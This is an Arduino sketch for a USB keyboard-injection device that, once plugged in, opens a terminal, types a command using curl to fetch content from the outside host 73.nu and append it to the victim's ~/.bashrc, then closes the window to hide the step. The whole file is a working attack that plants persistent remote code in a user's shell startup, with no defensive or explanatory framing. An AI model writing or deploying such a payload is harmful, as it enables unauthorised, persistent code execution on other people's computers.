#include <Keyboard.h>

void setup()
{
  Keyboard.begin();
  
  delay(500);

  delay(3000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(100);

  Keyboard.print("curl -s 73.nu/h0v >> ~/.bashrc");
  typeKey(KEY_RETURN);
  Keyboard.releaseAll();

  delay(1000);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press('q');
  Keyboard.releaseAll();

}

void typeKey(int key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

void loop() {}